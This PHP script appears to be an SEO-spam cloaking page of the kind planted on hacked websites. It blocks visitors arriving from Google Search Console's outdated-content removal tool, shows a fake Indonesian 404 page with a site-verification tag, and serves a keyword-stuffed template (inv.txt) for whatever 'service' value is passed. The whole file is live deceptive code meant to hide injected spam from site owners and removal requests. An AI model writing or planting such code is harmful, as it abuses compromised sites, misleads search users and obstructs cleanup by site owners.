<?php
error_reporting(0);
$referrer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
$blocked_domain = 'https://search.google.com/search-console/remove-outdated-content?hl=en';
if (strpos($referrer, $blocked_domain) !== false) {
    header('HTTP/1.0 403 Forbidden');
    echo 'Access is blocked from this referrer.';
    exit();
}
$brand = isset($_GET['service']) ? $_GET['service'] : '';
if (empty($brand)) {
    header("HTTP/1.0 404 Not Found");
    echo '
    <!DOCTYPE html>
    <html lang="id">
    <head>
      <meta name="google-site-verification" content="J4Aenkg_hUh3ccJ0qhVtnrDR7UyYr0K74_UqYAOtM2E" />
      <meta charset="UTF-8">
      <title>404 - Halaman Tidak Ditemukan</title>
      <style>
        body {
          background-color: #fff;
          color: #2c3e50;
          font-family: Arial, sans-serif;
          text-align: center;
          padding: 80px;
        }
        h1 {
          font-size: 50px;
          color: #e74c3c;
        }
        p {
          font-size: 20px;
          margin-top: 20px;
        }
        a {
          color: #3498db;
          text-decoration: none;
        }
      </style>
    </head>
    <body>
      <h1>404</h1>
      <p>Maaf, halaman yang Anda cari tidak ditemukan.</p>
      <p><a href="/">Kembali ke Beranda</a></p>
    </body>
    </html>';
    exit();
}
$canonical = strtolower(trim(preg_replace('/[^a-z0-9- ]+/i', '', $brand)));
$canonical = str_replace(' ', '+', $canonical);
$file = "inv.txt";
if (!file_exists($file)) {
    header("HTTP/1.0 404 Not Found");
    exit();
}

$isi = file_get_contents($file);
if ($isi === false) {
    header("HTTP/1.0 500 Internal Server Error");
    exit();
}
$isi = str_replace("{{BRANDS}}", strtoupper(htmlspecialchars($brand)), $isi);
$isi = str_replace("{{BRANDS_CANONICAL}}", $canonical, $isi);
echo $isi;
exit();
?>
